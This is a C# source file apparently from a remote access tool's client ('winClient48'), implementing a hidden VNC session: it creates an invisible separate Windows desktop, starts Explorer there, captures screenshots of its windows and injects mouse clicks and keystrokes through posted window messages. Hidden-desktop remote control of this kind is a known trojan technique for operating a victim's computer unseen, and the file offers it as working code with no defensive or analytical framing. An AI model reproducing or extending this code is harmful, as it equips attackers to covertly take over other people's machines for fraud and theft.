using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Runtime.InteropServices;
using System.Drawing;
using System.Drawing.Imaging;
using System.Windows.Forms;
using System.IO;

namespace winClient48
{
    public class clsfnHvncSession : IDisposable
    {
        private IntPtr m_hDesktop;
        private string m_szDesktopName;
        private IntPtr m_hLastWnd;
        private bool m_disposed = false;

        private const uint GENERIC_ALL = 0x10000000;
        private const int UOI_NAME = 2;
        private const uint STARTF_USESHOWWINDOW = 0x00000001;
        private const int SW_MAXIMIZE = 3;
        private const uint PW_RENDERFULLCONTENT = 0x00000002;

        public clsfnHvncSession(string szDesktopName)
        {
            m_szDesktopName = szDesktopName;
            m_hDesktop = WinAPI.CreateDesktop(szDesktopName, IntPtr.Zero, IntPtr.Zero, 0, GENERIC_ALL, IntPtr.Zero);

            if (m_hDesktop == IntPtr.Zero)
                throw new Exception("Create window failed.");
        }

        private IntPtr GetDeepestChild(IntPtr hWndParent, int x, int y)
        {
            Point pt = new Point(x, y);
            WinAPI.ScreenToClient(hWndParent, ref pt);

            IntPtr hWndChild = WinAPI.ChildWindowFromPointEx(hWndParent, pt, 0x0000); // CWP_ALL

            if (hWndChild != IntPtr.Zero && hWndChild != hWndParent)
            {
                IntPtr hRecursiveChild = GetDeepestChild(hWndChild, x, y);
                return hRecursiveChild != IntPtr.Zero ? hRecursiveChild : hWndChild;
            }

            return hWndParent;
        }

        public void fnStartExplorer()
        {
            WinAPI.STARTUPINFO si = new WinAPI.STARTUPINFO();
            si.cb = Marshal.SizeOf(si);
            si.lpDesktop = m_szDesktopName;
            si.dwFlags = 0x00000001;
            si.wShowWindow = (short)SW_MAXIMIZE;

            WinAPI.PROCESS_INFORMATION pi = new WinAPI.PROCESS_INFORMATION();

            //"explorer.exe /separate"
            StringBuilder sb = new StringBuilder("explorer.exe /separate");

            bool success = WinAPI.CreateProcess(
                null,
                sb,
                IntPtr.Zero,
                IntPtr.Zero,
                false,
                0,
                IntPtr.Zero,
                null,
                ref si,
                out pi
            );

            if (success)
            {
                WinAPI.CloseHandle(pi.hProcess);
                WinAPI.CloseHandle(pi.hThread);
            }
        }

        public Bitmap fnGetScreenshot(int nWidth, int nHeight)
        {
            WinAPI.SetThreadDesktop(m_hDesktop);

            Bitmap bmp = new Bitmap(nWidth, nHeight, PixelFormat.Format32bppPArgb);
            using (Graphics g = Graphics.FromImage(bmp))
            {
                g.Clear(Color.FromArgb(45, 45, 45));
                IntPtr hdc = g.GetHdc();

                List<IntPtr> windowList = new List<IntPtr>();

                WinAPI.EnumDesktopWindows(m_hDesktop, (hWnd, lParam) =>
                {
                    if (WinAPI.IsWindowVisible(hWnd))
                    {
                        windowList.Add(hWnd);
                    }
                    return true;
                }, IntPtr.Zero);

                windowList.Reverse();

                foreach (IntPtr hWnd in windowList)
                {
                    WinAPI.PrintWindow(hWnd, hdc, PW_RENDERFULLCONTENT);
                }

                g.ReleaseHdc(hdc);
            }
            return bmp;
        }

        public void fnHandleMouseInput(string type, int x, int y)
        {
            WinAPI.SetThreadDesktop(m_hDesktop);

            IntPtr hTopWnd = WinAPI.WindowFromPoint(x, y);

            IntPtr hWnd = GetDeepestChild(hTopWnd, x, y);
            m_hLastWnd = hWnd;

            if (IntPtr.Zero == hWnd)
            {
                //File.WriteAllText("nothing.txt", "nothing");
                return;
            }

            /*

            StringBuilder sb = new StringBuilder(256);
            WinAPI.GetClassName(hWnd, sb, 256);
            File.WriteAllText("something.txt", sb.ToString());

            */

            Point p = new Point(x, y);
            WinAPI.ScreenToClient(hWnd, ref p);
            IntPtr lParam = (IntPtr)((p.Y << 16) | (p.X & 0xFFFF));

            switch (type.ToUpper())
            {
                case "MOVE":
                    WinAPI.PostMessage(hWnd, 0x0200, IntPtr.Zero, lParam);
                    break;
                case "LD":
                    WinAPI.PostMessage(hWnd, 0x0200, IntPtr.Zero, lParam); // WM_MOUSEMOVE

                    WinAPI.SendMessage(hWnd, 0x0021, hTopWnd, (IntPtr)((0x0201 << 16) | 1)); // WM_MOUSEACTIVATE
                    WinAPI.SendMessage(hWnd, 0x0020, hWnd, (IntPtr)((0x0201 << 16) | 1));    // WM_SETCURSOR

                    WinAPI.SendMessage(hWnd, 0x0006, 1, 0); // WM_ACTIVATE
                    WinAPI.SendMessage(hWnd, 0x0007, 0, 0); // WM_SETFOCUS
                    WinAPI.PostMessage(hWnd, 0x0201, (IntPtr)0x0001, lParam); // WM_LBUTTONDOWN
                    break;
                case "LU":
                    WinAPI.PostMessage(hWnd, 0x0202, IntPtr.Zero, lParam);
                    break;
                case "RD":
                    WinAPI.PostMessage(hWnd, 0x0204, (IntPtr)2, lParam);
                    break;
                case "RU":
                    WinAPI.PostMessage(hWnd, 0x0205, IntPtr.Zero, lParam);
                    break;
            }

            if (type != "MOVE")
            {
                File.WriteAllText("action.txt", $"{type},{x},{y}");
            }
        }

        public void fnHandleKeyboardInput(string action, int vk)
        {
            WinAPI.SetThreadDesktop(m_hDesktop);
            IntPtr hWnd = (m_hLastWnd != IntPtr.Zero) ? m_hLastWnd : WinAPI.GetForegroundWindow();

            if (hWnd != IntPtr.Zero)
            {
                uint scanCode = WinAPI.MapVirtualKey((uint)vk, 0);
                uint lParam;

                if (action.ToLower() == "down")
                {
                    lParam = 0x00000001 | (scanCode << 16);
                    WinAPI.PostMessage(hWnd, 0x0100, (IntPtr)vk, (IntPtr)lParam);

                    if (IsTextKey(vk))
                    {
                        WinAPI.PostMessage(hWnd, 0x0102, (IntPtr)vk, (IntPtr)lParam);
                    }
                }
                else
                {
                    lParam = 0xC0000001 | (scanCode << 16);
                    WinAPI.PostMessage(hWnd, 0x0101, (IntPtr)vk, (IntPtr)lParam);
                }
            }
        }

        private bool IsTextKey(int vk) => (vk >= 65 && vk <= 90) || (vk >= 48 && vk <= 57) || vk == 32 || vk == 13;

        public void Dispose()
        {
            if (!m_disposed)
            {
                if (m_hDesktop != IntPtr.Zero)
                    WinAPI.CloseDesktop(m_hDesktop);
                m_disposed = true;
            }
        }
    }
}